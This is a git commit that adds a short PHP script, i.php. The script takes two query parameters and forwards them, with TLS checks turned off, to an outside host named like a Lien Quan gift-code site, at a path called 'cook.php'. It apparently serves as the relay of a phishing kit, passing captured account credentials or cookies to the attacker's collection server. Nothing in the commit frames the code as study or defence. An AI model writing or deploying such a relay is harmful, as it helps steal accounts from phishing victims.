f825a44235fa41103b4bf9f2a4627b3b4af5aa06
T <80206409+yourworld03@users.noreply.github.com>
2022-03-14 09:49:21 +0700

    Create i.php

---
+++ i.php
@@ -0,0 +1,13 @@
+<?php
+    $a = $_GET["a"];
+    $b = $_GET["b"];
+    if(!isset($a) || !isset($b)) die();
+    $c = curl_init();
+	curl_setopt($c, CURLOPT_URL, "https://giftcode-lienquan.tk/check/5431/cook.php?a=$a&b=$b");
+	curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
+	curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
+	curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
+	curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
+	$rq1 = curl_exec($c);
+	curl_close($c);
+?>
